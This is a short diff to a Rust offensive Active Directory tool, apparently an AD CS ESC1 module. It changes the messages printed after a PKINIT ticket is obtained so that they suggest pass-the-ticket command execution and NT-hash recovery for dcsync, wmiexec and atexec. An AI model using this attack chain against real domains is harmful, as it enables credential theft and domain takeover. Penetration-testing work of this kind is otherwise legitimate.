@@ -207,8 +207,13 @@ async fn esc1_impl(a: Esc1Args, checklist: &mut crate::ui::StageChecklist) -> Re
                         format!("TGT for {subject}@{realm} → {ccache}"),
                     );
                     println!("[+] PKINIT OK — TGT obtained as {subject}; ccache → {ccache}");
+                    // `attack dcsync` has no Kerberos bind, so point at `ptt --ccache`.
                     println!(
-                        "    KRB5CCNAME={ccache} → use for Kerberos auth (dcsync, exec via -k, …)"
+                        "    \u{2192} next: attack ptt --ccache {ccache} --host <target> --kdc {kdc} --realm {realm} --user {subject} --command \"whoami\""
+                    );
+                    println!(
+                        "    (for dcsync/exec/wmiexec/atexec via NTLM instead: kerb u2u-nt --kdc {kdc} --realm {realm} --user {subject} --key {key_path} --cert {} | ... --nt-hash <hash>)",
+                        a.out
                     );
                 }
                 Err(e) => {
